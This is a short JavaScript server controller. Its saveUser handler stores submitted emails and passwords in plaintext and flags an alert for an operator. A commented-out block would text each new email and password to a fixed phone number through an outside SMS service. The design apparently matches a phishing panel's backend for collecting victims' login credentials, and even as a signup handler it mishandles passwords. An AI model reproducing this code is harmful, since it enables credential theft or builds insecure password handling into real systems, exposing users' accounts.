import User from "@/models/userModel";
import Data from "@/models/dataModel";
import Client from "@/models/clientDataModel";



const saveUser = async (req, res) => {
  const { user, password, deviceType } = req.body;

  // Input validation
  if (!user || !password) {
    return res.status(400).json({
      success: false,
      message: !user ? "Input email..!" : "Input password..!",
    });
  }

  try {
    // Save user to database
    const savedUser = await User.create({
      email: user,
      password,
      deviceType,
    });


    // Send SMS
    // const smsOptions = {
    //   api_key: process.env.BULKSMSBD_API_KEY,
    //   type: "text",
    //   number: process.env.SMS_RECEIVER,
    //   senderid: process.env.BULKSMSBD_SENDER_ID,
    //   message: `New user registered:\n${user}\n${password}`,
    // };

    // await axios.get(`http://bulksmsbd.net/api/smsapi?${new URLSearchParams(smsOptions).toString()}`);

    // Update data
    const data = await Data.findOne();
    await Data.findByIdAndUpdate(data._id, {
      $inc: { notifications: 1 },
      $set: { alert: true },
    });

    return res.status(201).json({
      success: true,
      message: "User saved..!",
      data: savedUser,
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: "Server error..!",
    });
  }
};

const dataForClient = async (req, res) => {
  try {
    const data = await Client.findOne();
    if (!data) {
      const createdData = await Client.create({});
      return res.status(200).json({
        success: true,
        message: "data gotted..",
        data: createdData,
      });
    }
    return res.status(200).json({
      success: true,
      message: "data gotted..",
      data: data,
    });
  } catch (error) {
    return res.status(200).json({
      success: false,
      message: error,
    });
  }
};
module.exports = {
  saveUser,
  dataForClient,
};
